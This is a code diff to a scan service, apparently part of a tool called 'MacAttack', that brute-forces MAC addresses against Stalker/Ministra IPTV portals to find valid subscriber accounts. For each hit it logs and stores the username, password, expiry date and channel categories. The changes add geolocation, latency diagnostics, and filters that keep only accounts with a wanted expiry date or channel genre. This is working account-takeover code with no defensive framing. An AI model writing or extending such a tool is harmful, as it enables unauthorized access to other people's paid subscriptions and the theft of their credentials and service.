@@ -33,9 +33,21 @@
  */
 
 import { lookup } from "node:dns/promises";
+import { performance } from "node:perf_hooks";
 import { db } from "@/db";
 import { scanJobs, scanResults, scanLogs } from "@/db/schema";
 import { eq } from "drizzle-orm";
+import {
+  tcpPing,
+  measureHttpRequest,
+  parseHostPort,
+} from "@/lib/network-diags";
+import {
+  genresPassFilter,
+  expiryPassesFilter,
+  type GenreFilterConfig,
+  type ExpireFilterConfig,
+} from "@/lib/filters";
 
 // ============================================================================
 // ACTIVE SCANS MANAGEMENT
@@ -308,9 +320,11 @@ async function sendToHomeAssistant(
 /**
  * Resolve portal hostname -> IP -> geolocation.
  *
- * Based on current public documentation, api.country.is provides free no-key
- * geolocation over HTTPS and supports extra fields like city, subdivision,
- * coordinates, and ASN.
+ * Uses ipwho.is (free, no API key, HTTPS) which returns rich fields:
+ *   city, region, country, continent, latitude/longitude, timezone,
+ *   isp, org, asn, etc.
+ * If ipwho.is fails we fall back to api.country.is (country-only) so we
+ * always show *something*.
  */
 async function resolveServerLocation(
   portalUrl: string
@@ -326,40 +340,68 @@ async function resolveServerLocation(
     const dnsResult = await lookup(hostname);
     const ip = dnsResult.address;
 
-    const geoResponse = await fetch(
-      `https://api.country.is/${ip}?fields=city,continent,subdivision,location,asn`
-    );
+    // Primary — ipwho.is over HTTPS, no key.
+    try {
+      const geoResponse = await fetch(`https://ipwho.is/${ip}`);
+      if (geoResponse.ok) {
+        const geo = (await geoResponse.json()) as Record<string, unknown>;
+        if (geo.success !== false) {
+          const city = String(geo.city || "");
+          const region = String(geo.region || "");
+          const country = String(geo.country || "");
+          const continent = String(geo.continent || "");
 
-    if (!geoResponse.ok) {
-      return {
-        ip,
-        label: `IP ${ip}`,
-        raw: null,
-      };
+          const connection =
+            geo.connection && typeof geo.connection === "object"
+              ? (geo.connection as Record<string, unknown>)
+              : null;
+          const isp = String(
+            geo.isp || connection?.isp || geo.org || connection?.org || ""
+          );
+          const asnVal =
+            geo.asn ?? connection?.asn ?? geo.as ?? connection?.as ?? null;
+          const asnOrg =
+            typeof asnVal === "object" && asnVal
+              ? (asnVal as Record<string, unknown>).org ??
+                (asnVal as Record<string, unknown>).name ??
+                ""
+              : asnVal
+              ? String(asnVal)
+              : "";
+
+          const parts = [city, region, country].filter(Boolean);
+          let label =
+            parts.length > 0
+              ? parts.join(", ")
+              : country || continent || `IP ${ip}`;
+          if (ip) label += ` (IP: ${ip})`;
+          if (isp) label += ` | ISP: ${isp}`;
+          if (asnOrg && String(asnOrg) !== isp) label += ` | AS: ${asnOrg}`;
+
+          return { ip, label, raw: geo };
+        }
+      }
+    } catch {
+      // fall through to backup
     }
 
-    const geo = (await geoResponse.json()) as Record<string, unknown>;
-
-    const city = String(geo.city || "");
-    const subdivision = String(geo.subdivision || "");
-    const country = String(geo.country || "");
-    const continent = String(geo.continent || "");
-    const asn = geo.asn && typeof geo.asn === "object" ? geo.asn : null;
-
-    const parts = [city, subdivision, country].filter(Boolean);
-    const humanLocation = parts.length > 0 ? parts.join(", ") : country || continent || `IP ${ip}`;
-
-    let label = humanLocation;
-    if (ip) label += ` (IP: ${ip})`;
-    if (asn && "organization" in asn && typeof asn.organization === "string") {
-      label += ` | ASN: ${asn.organization}`;
+    // Fallback — api.country.is (country only).
+    try {
+      const geoResponse = await fetch(`https://api.country.is/${ip}`);
+      if (geoResponse.ok) {
+        const geo = (await geoResponse.json()) as Record<string, unknown>;
+        const country = String(geo.country || "");
+        return {
+          ip,
+          label: country ? `${country} (IP: ${ip})` : `IP ${ip}`,
+          raw: geo,
+        };
+      }
+    } catch {
+      // fall through
     }
 
-    return {
-      ip,
-      label,
-      raw: geo,
-    };
+    return { ip, label: `IP ${ip}`, raw: null };
   } catch {
     return {
       ip: null,
@@ -610,12 +652,16 @@ async function fetchGenres(
   portalBase: string,
   mac: string,
   token: string,
-  type: "itv" | "vod",
+  type: "itv" | "vod" | "series",
   timeoutMs: number,
   aborted: () => boolean
 ): Promise<Array<{ id: string; title: string }> | null> {
   if (aborted()) return null;
 
+  // Stalker endpoints:
+  //   itv   -> get_genres      (live TV genres)
+  //   vod   -> get_categories  (VOD / movies)
+  //   series-> get_categories  (TV shows / series, on Ministra)
   const action = type === "itv" ? "get_genres" : "get_categories";
   const url = `${serverPath}?type=${type}&action=${action}&JsHttpRequest=1-xml`;
 
@@ -664,7 +710,14 @@ function isAccountInfoValid(info: Record<string, unknown>): boolean {
   if (Object.keys(info).length === 0) return false;
 
   const mac = info.mac || info.login;
-  const expiry = info.phone || info.end_date || info.expire_billing_date;
+  // NOTE: `info.phone` in Stalker responses is the EXPIRATION DATE (YYYY-MM-DD),
+  // not a real telephone number. It is included here as an expiry signal.
+  const expiry =
+    info.phone ||
+    info.end_date ||
+    info.expire_billing_date ||
+    info.expire ||
+    info.expiry;
   const tariff = info.tariff_plan;
   const status = info.status;
 
@@ -732,6 +785,32 @@ export async function startScan(jobId: number, skipVerification: boolean = false
     const haEntityId = job.haEntityId || "";
     const totalCombinations = getTotalMacCombinations(macPrefix);
 
+    // ── Build filter configs from the persisted job row ────────────────
+    const genreFilter: GenreFilterConfig = {
+      enabled: Boolean((job as Record<string, unknown>).genreFilterEnabled),
+      keywords: String((job as Record<string, unknown>).genreFilterKeywords || ""),
+      matchLive: Boolean(
+        (job as Record<string, unknown>).genreFilterMatchLive ?? true
+      ),
+      matchVod: Boolean(
+        (job as Record<string, unknown>).genreFilterMatchVod ?? true
+      ),
+      matchSeries: Boolean(
+        (job as Record<string, unknown>).genreFilterMatchSeries ?? true
+      ),
+    };
+    const expireFilter: ExpireFilterConfig = {
+      enabled: Boolean((job as Record<string, unknown>).expireFilterEnabled),
+      minDate: (job as Record<string, unknown>).expireFilterMinDate
+        ? String((job as Record<string, unknown>).expireFilterMinDate)
+        : null,
+      includeUnlimited: Boolean(
+        (job as Record<string, unknown>).expireFilterIncludeUnlimited ?? true
+      ),
+    };
+
+    let filteredOut = 0;
+
     await addLog(jobId, "info", "════════════════════════════════════════");
     await addLog(jobId, "info", "        MacAttack Scan Starting");
     await addLog(jobId, "info", "════════════════════════════════════════");
@@ -739,6 +818,30 @@ export async function startScan(jobId: number, skipVerification: boolean = false
     await addLog(jobId, "info", `MAC Prefix: ${macPrefix}`);
     await addLog(jobId, "info", `Timeout: ${timeoutMs}ms`);
     await addLog(jobId, "info", `Total MAC combinations in this prefix: ${totalCombinations.toString()}`);
+
+    if (expireFilter.enabled) {
+      await addLog(
+        jobId,
+        "info",
+        `Expire filter ON: keep accounts expiring on/after ${
+          expireFilter.minDate || "any date"
+        }${expireFilter.includeUnlimited ? " (including unlimited)" : " (excluding unlimited)"}`
+      );
+    }
+    if (genreFilter.enabled) {
+      const types = [
+        genreFilter.matchLive ? "Live" : null,
+        genreFilter.matchVod ? "VOD" : null,
+        genreFilter.matchSeries ? "Series" : null,
+      ]
+        .filter(Boolean)
+        .join("/");
+      await addLog(
+        jobId,
+        "info",
+        `Genre filter ON: match keywords [${genreFilter.keywords}] in [${types}] categories`
+      );
+    }
 
     let serverPath: string;
     let portalBase: string;
@@ -775,7 +878,7 @@ export async function startScan(jobId: number, skipVerification: boolean = false
       await addLog(jobId, "success", `Found working endpoint: ${serverPath}`);
     }
 
-    // Resolve server geolocation once at the beginning.
+    // ── Resolve server geolocation once at the beginning. ─────────────
     await addLog(jobId, "info", "Resolving server IP and location...");
     const serverGeo = await resolveServerLocation(job.portalUrl);
     if (serverGeo.ip) {
@@ -784,9 +887,132 @@ export async function startScan(jobId: number, skipVerification: boolean = false
       await addLog(jobId, "warning", "Could not determine server geolocation");
     }
 
+    // ── TCP ping diagnostics ──────────────────────────────────────────
+    await addLog(jobId, "info", "Measuring network latency (TCP ping)...");
+
+    let pingStats: {
+      minMs: number | null;
+      avgMs: number | null;
+      maxMs: number | null;
+      stdevMs: number | null;
+      lossPct: number;
+      probes: number;
+      error?: string;
+    } = {
+      minMs: null, avgMs: null, maxMs: null, stdevMs: null,
+      lossPct: 100, probes: 0, error: undefined,
+    };
+
+    try {
+      const { host, port } = parseHostPort(serverPath);
+      await addLog(jobId, "info", `TCP-pinging ${host}:${port} (5 probes)...`);
+      const ping = await tcpPing(host, port, {
+        probes: 5,
+        intervalMs: 200,
+        timeoutMs: Math.max(2000, timeoutMs),
+      });
+      pingStats = {
+        minMs: ping.minMs,
+        avgMs: ping.avgMs,
+        maxMs: ping.maxMs,
+        stdevMs: ping.stdevMs,
+        lossPct: ping.lossPct,
+        probes: ping.probes,
+      };
+
+      if (ping.successful > 0) {
+        await addLog(
+          jobId,
+          "success",
+          `TCP ping: min ${ping.minMs?.toFixed(1)}ms · avg ${ping.avgMs?.toFixed(1)}ms · ` +
+            `max ${ping.maxMs?.toFixed(1)}ms · stdev ${ping.stdevMs?.toFixed(1)}ms · ` +
+            `loss ${ping.lossPct.toFixed(0)}% (${ping.successful}/${ping.probes} ok)`
+        );
+      } else {
+        await addLog(jobId, "warning", "TCP ping failed — all probes timed out or were rejected");
+        pingStats.error = "All TCP probes failed";
+      }
+    } catch (err) {
+      pingStats.error = err instanceof Error ? err.message : "Unknown error";
+      await addLog(jobId, "warning", `TCP ping failed: ${pingStats.error}`);
+    }
+
+    // ── HTTP timing waterfall ─────────────────────────────────────────
+    await addLog(jobId, "info", "Measuring HTTP response time (DNS/TCP/TLS/TTFB)...");
+
+    let httpTimings: {
+      dnsMs: number | null;
+      tcpMs: number | null;
+      tlsMs: number | null;
+      ttfbMs: number | null;
+      totalMs: number;
+      statusCode: number | null;
+      error?: string;
+    } = {
+      dnsMs: null, tcpMs: null, tlsMs: null, ttfbMs: null,
+      totalMs: 0, statusCode: null, error: undefined,
+    };
+
+    try {
+      const handshakeUrl =
+        `${serverPath}?type=stb&action=handshake&prehash=0&token=&JsHttpRequest=1-xml`;
+      const timing = await measureHttpRequest(handshakeUrl, {
+        timeoutMs: Math.max(5000, timeoutMs * 2),
+        headers: {
+          Cookie: "mac=00:1A:79:00:00:00; stb_lang=en; timezone=Europe/London",
+          Referer: portalBase,
+        },
+      });
+      httpTimings = timing;
+
+      if (timing.statusCode && !timing.error) {
+        const breakdown = [
+          timing.dnsMs !== null ? `DNS ${timing.dnsMs.toFixed(0)}ms` : null,
+          timing.tcpMs !== null ? `TCP ${timing.tcpMs.toFixed(0)}ms` : null,
+          timing.tlsMs !== null ? `TLS ${timing.tlsMs.toFixed(0)}ms` : null,
+          timing.ttfbMs !== null ? `TTFB ${timing.ttfbMs.toFixed(0)}ms` : null,
+        ]
+          .filter(Boolean)
+          .join(" · ");
+        await addLog(
+          jobId,
+          "success",
+          `HTTP timing: ${breakdown} · total ${timing.totalMs.toFixed(0)}ms (status ${timing.statusCode})`
+        );
+      } else {
+        await addLog(jobId, "warning", `HTTP timing failed: ${timing.error || "no response"}`);
+      }
+    } catch (err) {
+      httpTimings.error = err instanceof Error ? err.message : "Unknown error";
+      await addLog(jobId, "warning", `HTTP timing failed: ${httpTimings.error}`);
+    }
+
+    // ── Persist diagnostics + geolocation on the job row ──────────────
     await db
       .update(scanJobs)
-      .set({ status: "running", updatedAt: new Date() })
+      .set({
+        status: "running",
+        updatedAt: new Date(),
+        // TCP ping
+        pingMinMs: pingStats.minMs,
+        pingAvgMs: pingStats.avgMs,
+        pingMaxMs: pingStats.maxMs,
+        pingStdevMs: pingStats.stdevMs,
+        pingLossPct: pingStats.lossPct,
+        pingProbes: pingStats.probes,
+        pingProbeMs: 200,
+        pingError: pingStats.error || null,
+        // HTTP waterfall
+        httpDnsMs: httpTimings.dnsMs,
+        httpTcpMs: httpTimings.tcpMs,
+        httpTlsMs: httpTimings.tlsMs,
+        httpTtfbMs: httpTimings.ttfbMs,
+        httpTotalMs: httpTimings.totalMs,
+        httpStatusCode: httpTimings.statusCode,
+        // Geolocation
+        serverIp: serverGeo.ip,
+        serverGeoRaw: serverGeo.raw,
+      })
       .where(eq(scanJobs.id, jobId));
 
     await addLog(jobId, "info", "");
@@ -907,6 +1133,9 @@ export async function startScan(jobId: number, skipVerification: boolean = false
 
         try {
           // STEP 1 – Handshake (token alone does NOT mean the MAC is valid)
+          // We measure elapsed time for handshake + account_info as the
+          // "response time" for this MAC — reflects real end-user latency.
+          const macTestStart = performance.now();
           const token = await doHandshake(serverPath, portalBase, mac, timeoutMs, isAborted);
           if (!token) {
             continue;
@@ -926,7 +1155,31 @@ export async function startScan(jobId: number, skipVerification: boolean = false
             continue;
           }
 
-          // ── Valid MAC found ──────────────────────────────────────────
+          const responseTimeMs = Math.round(performance.now() - macTestStart);
+
+          // ── Early-expire filter (cheap — no extra HTTP needed) ──────
+          const earlyExpiry = String(
+            (accountInfo as Record<string, unknown>).end_date ||
+              (accountInfo as Record<string, unknown>).expire_billing_date ||
+              (accountInfo as Record<string, unknown>).phone ||
+              (accountInfo as Record<string, unknown>).expire ||
+              (accountInfo as Record<string, unknown>).expiry ||
+              ""
+          );
+          if (expireFilter.enabled) {
+            const expiryCheck = expiryPassesFilter(expireFilter, earlyExpiry);
+            if (!expiryCheck.pass) {
+              filteredOut += 1;
+              await addLog(
+                jobId,
+                "info",
+                `MAC ${mac} valid but filtered out by expire date (${expiryCheck.reason})`
+              );
+              continue;
+            }
+          }
+
+          // ── Valid MAC found (account-info-wise) ────────────────────
           found += 1;
 
           await addLog(jobId, "info", "");
@@ -947,22 +1200,72 @@ export async function startScan(jobId: number, skipVerification: boolean = false
             await addLog(jobId, "warning", "✗ Could not retrieve profile data");
           }
 
-          const itvGenres = await fetchGenres(
-            serverPath, portalBase, mac, token, "itv", timeoutMs, isAborted
-          );
-          if (itvGenres && itvGenres.length > 0) {
-            await addLog(jobId, "info", `✓ Retrieved ${itvGenres.length} ITV genres`);
-          } else {
-            await addLog(jobId, "warning", "✗ Could not retrieve ITV genres");
+          const needLive = !genreFilter.enabled || genreFilter.matchLive;
+          const needVod = !genreFilter.enabled || genreFilter.matchVod;
+          const needSeries = genreFilter.enabled && genreFilter.matchSeries;
+
+          let itvGenres: Array<{ id: string; title: string }> | null = null;
+          let vodCategories: Array<{ id: string; title: string }> | null = null;
+          let seriesCategories: Array<{ id: string; title: string }> | null = null;
+
+          if (needLive) {
+            itvGenres = await fetchGenres(
+              serverPath, portalBase, mac, token, "itv", timeoutMs, isAborted
+            );
+            if (itvGenres && itvGenres.length > 0) {
+              await addLog(jobId, "info", `✓ Retrieved ${itvGenres.length} ITV genres`);
+            } else {
+              await addLog(jobId, "warning", "✗ Could not retrieve ITV genres");
+            }
           }
 
-          const vodCategories = await fetchGenres(
-            serverPath, portalBase, mac, token, "vod", timeoutMs, isAborted
-          );
-          if (vodCategories && vodCategories.length > 0) {
-            await addLog(jobId, "info", `✓ Retrieved ${vodCategories.length} VOD categories`);
-          } else {
-            await addLog(jobId, "warning", "✗ Could not retrieve VOD categories");
+          if (needVod) {
+            vodCategories = await fetchGenres(
+              serverPath, portalBase, mac, token, "vod", timeoutMs, isAborted
+            );
+            if (vodCategories && vodCategories.length > 0) {
+              await addLog(jobId, "info", `✓ Retrieved ${vodCategories.length} VOD categories`);
+            } else {
+              await addLog(jobId, "warning", "✗ Could not retrieve VOD categories");
+            }
+          }
+
+          if (needSeries) {
+            seriesCategories = await fetchGenres(
+              serverPath, portalBase, mac, token, "series", timeoutMs, isAborted
+            );
+            if (seriesCategories && seriesCategories.length > 0) {
+              await addLog(jobId, "info", `✓ Retrieved ${seriesCategories.length} Series categories`);
+            } else {
+              await addLog(jobId, "warning", "✗ Could not retrieve Series categories (portal may not support them)");
+            }
+          }
+
+          // ── Genre filter ──────────────────────────────────────────
+          if (genreFilter.enabled) {
+            const genreCheck = genresPassFilter(
+              genreFilter,
+              itvGenres,
+              vodCategories,
+              seriesCategories
+            );
+            if (!genreCheck.pass) {
+              filteredOut += 1;
+              found -= 1;
+              await addLog(
+                jobId,
+                "info",
+                `MAC ${mac} valid but filtered out by genre (no matching categories for keywords: ${genreFilter.keywords})`
+              );
+              continue;
+            }
+            if (genreCheck.matchedTitle) {
+              await addLog(
+                jobId,
+                "success",
+                `Genre match: "${genreCheck.matchedTitle}"`
+              );
+            }
           }
 
           // Extract and format data
@@ -975,10 +1278,32 @@ export async function startScan(jobId: number, skipVerification: boolean = false
           const tariff =
             (combined.tariff_plan as { name?: string })?.name ||
             String(combined.tariff_plan || "");
+
+          // IMPORTANT: In Stalker middleware responses the `phone` field
+          // contains the subscription EXPIRATION DATE (YYYY-MM-DD), NOT a
+          // real telephone number.  Always treat it as an expiry source.
+          // Real phone numbers (rarely provided) live in fields like
+          // `phone_number`, `mobile`, `contact_phone`, `telephone`.
           const expiry = String(
-            combined.end_date || combined.expire_billing_date || combined.phone || ""
+            combined.end_date ||
+              combined.expire_billing_date ||
+              combined.phone ||
+              combined.expire ||
+              combined.expiry ||
+              combined.endDate ||
+              ""
           );
-          const phoneNumber = String(combined.phone || "");
+
+          // Only accept values from fields that actually hold telephone numbers.
+          // Skip `combined.phone` here because that is an expiry date in Stalker.
+          const rawPhone =
+            combined.phone_number ||
+            combined.mobile ||
+            combined.contact_phone ||
+            combined.telephone ||
+            combined.tel ||
+            "";
+          const phoneNumber = String(rawPhone);
 
           // Log all found data
           await addLog(jobId, "success", `Expiry: ${expiry || "N/A"}`);
@@ -987,6 +1312,7 @@ export async function startScan(jobId: number, skipVerification: boolean = false
           await addLog(jobId, "success", `Password: ${password || "N/A"}`);
           await addLog(jobId, "success", `Timezone: ${timezone || "N/A"}`);
           await addLog(jobId, "success", `Server Location: ${serverGeo.label}`);
+          await addLog(jobId, "success", `Response time: ${responseTimeMs}ms`);
           await addLog(jobId, "info", "Saving valid result to database...");
 
           // Save to database
@@ -1006,6 +1332,7 @@ export async function startScan(jobId: number, skipVerification: boolean = false
               : null,
             accountStatus: String(combined.status ?? ""),
             phoneNumber,
+            responseTimeMs,
             timezone,
             username: login,
             password,
@@ -1016,6 +1343,7 @@ export async function startScan(jobId: number, skipVerification: boolean = false
               account: accountInfo,
               itvGenres,
               vodCategories,
+              seriesCategories,
               serverGeo,
             },
           });
